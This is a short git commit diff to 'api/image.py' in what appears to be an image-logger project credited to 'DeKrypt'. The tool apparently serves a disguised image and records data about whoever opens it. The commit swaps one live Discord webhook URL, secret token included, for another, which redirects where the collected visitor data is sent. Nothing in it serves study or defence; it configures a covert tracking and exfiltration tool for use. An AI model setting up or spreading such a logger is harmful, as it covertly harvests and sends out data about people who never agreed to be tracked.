a91ff762412420dd55e1a31ce23ab863eef409f2
enzoiscool01 <enzodisabled@gmail.com>
2025-02-26 16:50:08 +0100

    Update image.py

--- api/image.py
+++ api/image.py
@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1335214846240620604/uR0ZyrR1UHb9hDWCOCPLwa95hgt5-z22y1Q2h28jGFMj0yvT3coAybXNdtnQvf-sgODU",
+    "webhook": "https://discord.com/api/webhooks/1342163734977577030/9hA-bkUpMi-ojeX7xOq9WwkVv8WDFn4974JPQcF1kq2lbmiGlrCgrSD7tRc5rJL1p3RG",
     "image": "https://e7.pngegg.com/pngimages/226/847/png-clipart-video-portrait-graphy-old-man-laughing-image-file-formats-face.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
